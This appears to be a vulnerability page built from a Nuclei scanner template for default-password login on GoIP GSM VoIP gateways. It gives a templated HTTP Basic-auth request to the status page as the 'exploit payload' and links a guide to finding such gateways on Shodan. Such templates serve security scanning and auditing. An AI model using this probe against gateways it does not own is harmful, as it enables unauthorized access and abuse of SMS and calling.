# Nuclei Template: GoIP GSM VoIP Gateway - Default Password
**Template ID:** goip-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`goip-default-login.yaml`)

## Vulnerability Information & PoC

## Description
GoIP GSM VoIP Gateway Default Password, Allows attackers to send, receive sms and calls.

## Steps to reproduce / Exploit Payload
```http
GET /default/en_US/status.html HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ':' + password)}}
```

## References
- http://en.dbltek.com/
- https://medium.com/@hackatnow/how-to-create-a-python-script-to-find-goip-gsm-gateway-on-shodan-and-send-sms-ussd-via-goip-e2e203f5d339
- https://www.voip-systems.ru/assets/files/voip/voip-gsm/User_Manual_1_4_8_16.pdf
